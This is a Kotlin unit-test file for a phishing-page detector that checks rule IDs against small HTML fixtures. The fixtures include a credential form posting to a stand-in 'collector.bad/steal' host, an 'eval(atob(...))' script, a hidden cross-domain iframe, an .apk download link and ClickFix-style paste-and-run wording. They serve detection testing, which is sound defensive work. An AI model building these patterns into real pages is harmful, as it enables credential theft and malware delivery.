package com.linkguard.app.data.provider

import com.linkguard.app.domain.model.SignalStrength
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class HttpCredentialFormInspectorTest {

    private val loginHtml =
        """<html><body><form action="/submit" method="post">
           <input type="text" name="user"><input type="password" name="pass">
           </form></body></html>"""

    @Test
    fun `password form on untrusted site is a medium signal`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, loginHtml))
            .inspect("http://login-evil.test/account")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_UNTRUSTED", signals[0].ruleId)
        assertEquals(SignalStrength.MEDIUM, signals[0].strength)
    }

    @Test
    fun `password form posting to another domain is a strong exfil signal`() = runBlocking {
        val html = """<form action="https://collector.bad/steal">
            <input type='password'></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://login-evil.test/account")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_EXFIL", signals[0].ruleId)
        assertEquals(SignalStrength.STRONG, signals[0].strength)
    }

    @Test
    fun `password form posting to a trusted identity provider is not exfil`() = runBlocking {
        // Legitimate OAuth: a password field plus a form posting to a trusted IdP must not
        // be treated as cross-domain credential theft (still flagged as untrusted login).
        val html = """<form action="https://accounts.google.com/signin">
            <input type="password"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://some-portal.test/login")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_UNTRUSTED", signals[0].ruleId)
    }

    @Test
    fun `page without a password field yields no signal`() = runBlocking {
        val html = "<html><body><form><input type='text' name='q'></form></body></html>"
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://news.test/article")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `non-html content type is not parsed`() = runBlocking {
        // A JSON body that happens to contain the literal text must not be scanned as HTML.
        val body = """{"note":"<input type=password>"}"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, body, "application/json"))
            .inspect("http://api.test/data")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `trusted domain is skipped without a request`() = runBlocking {
        // clientFailing would throw if a request were made; the trusted-host guard must skip first.
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("https://google.com/login")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `private host is skipped without a request (anti-SSRF)`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("http://192.168.1.1/login")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `non-2xx response yields no signal`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientReturningHtml(404, loginHtml))
            .inspect("http://login-evil.test/account")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `network failure is fail-soft, never throws`() = runBlocking {
        // An amplifier must never break the scan: a transport error becomes an empty result.
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("http://login-evil.test/account")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `otp and payment forms are detected without a password field`() = runBlocking {
        val html = """<form><input name="otp_code"><input name="card_number"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://checkout-evil.test/verify")
        assertTrue(signals.any { it.ruleId == "SENSITIVE_FORM_UNTRUSTED" })
    }

    @Test
    fun `brand impersonation and urgent language are corroborating signals`() = runBlocking {
        val html = """<h1>Google account security alert</h1>
            <p>Your account will be suspended, verify immediately.</p>
            <form action="/login"><input type="password" name="password"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://secure-check.test/account")
        assertTrue(signals.any { it.ruleId == "PAGE_BRAND_IMPERSONATION" })
        assertTrue(signals.any { it.ruleId == "URGENT_ACCOUNT_LANGUAGE" })
    }

    @Test
    fun `obfuscated script iframe and executable download are detected with sensitive context`() = runBlocking {
        val html = """<h1>Account verification required immediately</h1>
            <form><input type="password" name="password"></form>
            <iframe src="https://frame.example/collect"></iframe>
            <script src="https://cdn.example/app.js"></script>
            <script>eval(atob('abc'))</script>
            <a href="https://cdn.example/update.apk">Continue</a>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://verify-check.test/account")
        assertTrue(signals.any { it.ruleId == "SUSPICIOUS_PAGE_CODE" })
        assertTrue(signals.any { it.ruleId == "EXTERNAL_SCRIPT_WITH_SENSITIVE_FORM" })
        assertTrue(signals.any { it.ruleId == "SUSPICIOUS_CROSS_DOMAIN_FRAME" })
        assertTrue(signals.any { it.ruleId == "FORCED_EXECUTABLE_DOWNLOAD" })
    }

    @Test
    fun `hidden sensitive input is detected`() = runBlocking {
        val html = """<form><input type="hidden" name="recovery_token"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://recover-evil.test/account")
        assertTrue(signals.any { it.ruleId == "HIDDEN_SENSITIVE_INPUT" })
    }

    @Test
    fun `structured parser detects reordered unquoted attributes`() = runBlocking {
        val html = """<form method=post action=https://collector.bad/steal>
            <input name=secret autocomplete=current-password type=password></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://portal.test/login")
        assertTrue(signals.any { it.ruleId == "CREDENTIAL_FORM_EXFIL" })
    }

    @Test
    fun `multi-step email login is detected before password appears`() = runBlocking {
        val html = """<h1>Sign in</h1><form><input type=email name=user_email></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://clean-looking.test/start")
        assertTrue(signals.any { it.ruleId == "MULTI_STEP_LOGIN_FORM" })
    }

    @Test
    fun `identity collection is detected without password or payment fields`() = runBlocking {
        val html = """<form><input aria-label="Passport number"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://identity-check.test/verify")
        assertTrue(signals.any { it.ruleId == "IDENTITY_FORM_UNTRUSTED" })
    }

    @Test
    fun `clickfix command instructions are a strong malware-delivery signal`() = runBlocking {
        val html = """<h1>Verification failed</h1><p>Press Windows + R, paste the command, then run the command.</p>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://captcha-fix.test/check")
        assertTrue(signals.any {
            it.ruleId == "CLICKFIX_INSTRUCTIONS" && it.strength == SignalStrength.STRONG
        })
    }

    @Test
    fun `fullscreen form and encoded svg payload are corroborating signals`() = runBlocking {
        val html = """<div style="position:fixed;inset:0"><form><input type=password></form></div>
            <img src="data:image/svg+xml;base64,PHN2Zz4="/>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://overlay-login.test/")
        assertTrue(signals.any { it.ruleId == "FULLSCREEN_SENSITIVE_OVERLAY" })
        assertTrue(signals.any { it.ruleId == "ENCODED_PAGE_PAYLOAD" })
    }

    @Test
    fun `legitimate article mentioning brands without a sensitive form remains clean`() = runBlocking {
        val html = """<article><h1>Google and Microsoft announce security updates</h1></article>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("https://technology-news.test/article")
        assertTrue(signals.isEmpty())
    }
}
